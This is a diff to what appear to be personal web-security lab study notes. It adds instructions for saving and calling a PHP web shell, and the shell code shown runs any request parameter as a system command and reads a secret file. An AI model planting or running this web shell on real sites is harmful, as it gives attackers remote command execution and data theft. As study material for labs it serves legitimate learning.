@@ -31,6 +31,8 @@ To make the code secure it should include an exit(1),after re-directing the user
 ![[Pasted image 20251128130109.png]]
 
 ### PHP Simple Shell
+Save as command.php
+Access it by website/command.php?cmd=ls -la
 ```php
 <?php system($_REQUEST[cmd]); ?>
 <?php echo file_get_contents('/home/carlos/secret'); ?>
